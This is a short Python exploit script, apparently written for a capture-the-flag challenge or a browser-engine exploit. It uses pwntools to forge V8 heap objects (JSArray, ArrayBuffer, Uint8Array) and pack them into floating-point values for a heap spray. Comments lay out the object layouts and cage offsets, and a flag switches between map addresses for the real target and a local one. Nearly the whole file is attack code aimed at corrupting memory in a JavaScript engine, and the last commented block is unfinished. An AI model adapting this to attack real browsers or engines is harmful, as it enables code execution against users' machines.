import struct
from pwn import *

fake = p32(0x851) + p32(32 << 1)

"""
// JSARRAY
// [u32] => map
// [u32] => properties
// [u32] => elements
// [u32] => length (SMI)
"""

fake = p32(0x54efc1) + p32(0x6cd) + p32(0x6c2139) + p32(1024 << 1)

"""
// Uint8Array
// [u32] => map
// [u32] => properties
// [u32] => elements
// [u32] => ArrayBuffer
// [u64] => byte offset (big SMI)
// [u64] => byte length (big SMI)
// [u64] => 0x60 ??
// [u64] => 2 ??
// [u64] => offset
// [u64] => null
// [u64] => null

// address is cage base + (offset << 8)
"""

"""
// ArrayBuffer
// [u32] => map
// [u32] => properties
// [u32] => properties
// [u32] => detach key
// [u64] => byte length (big SMI)
// [u64] => max byte length (big SMI)
// [u64] => cage offset
// [u64] => smth in upper 32 bits, type in lower 32 bits ??
// [u64] => null
// [u64] => null
"""

if args.REAL:
    map = 0x74c195
    smth = 0x00000002000409c0
else:
    map = 0x18c069
    smth = 0x0000000200040ae0

fake = b""
# create ArrayBuffer
fake += p32(map)
fake += p32(0x6cd) * 2
fake += p32(0x61)
fake += p64(8 << 34)
fake += p64(8 << 34)
fake += p64(0)
fake += p64(smth)
fake += p64(0) * 2

format = "<"
format += "d" * (len(fake) // 8)
spray = list(struct.unpack(format, fake))
padding = [0.0] * 2

items = padding + spray * (512 // len(spray))
print(items)


"""
# create Uint8Array
fake += p32(0x545d05)
fake += p32(0x6cd)
fake += p32(0xe69)
fake += p32(0x6c2599)
fake += p64(0)
fake += p64(8 << 34)
fake += p64(0x60)
fake += p64(2)
fake += p64(0) * 3s
"""